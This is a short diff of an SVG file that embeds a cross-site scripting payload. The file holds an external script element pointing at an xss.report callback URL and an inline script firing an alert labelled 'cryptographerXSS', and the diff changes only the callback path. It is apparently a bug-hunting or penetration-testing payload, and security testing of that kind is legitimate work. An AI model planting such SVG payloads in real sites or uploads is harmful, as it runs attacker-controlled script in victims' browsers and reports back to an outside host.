@@ -9,7 +9,7 @@
        xmlns:xlink="http://www.w3.org/1999/xlink"
        xml:space="preserve">
     <!-- Script linked from the outside-->
-    <script xlink:href="https://xss.report/c/ltx" />
+    <script xlink:href="https://xss.report/c/cryp" />
     <script>
       //<![CDATA[
         alert("cryptographerXSS");
